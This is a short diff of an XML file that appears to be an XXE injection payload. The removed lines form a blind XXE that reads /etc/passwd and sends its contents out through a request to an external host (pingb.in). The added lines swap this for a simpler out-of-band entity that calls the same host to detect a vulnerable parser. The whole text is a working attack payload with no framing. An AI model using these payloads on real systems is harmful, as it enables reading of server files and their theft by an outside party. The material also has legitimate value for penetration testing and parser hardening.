@@ -1,5 +1,4 @@
 <?xml version="1.0"?>
-<!DOCTYPE foo [
+<!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
-<!ENTITY % xxe SYSTEM "file:///etc/passwd">
-<!ENTITY blind SYSTEM "http://pingb.in/p/5e7a6b08bb81f50d2bc159197a79/?%xxe;">]><foo>&blind;</foo>
+<!ENTITY xxe SYSTEM "http://pingb.in/p/5e7a6b08bb81f50d2bc159197a79">]><foo>&xxe;</foo>
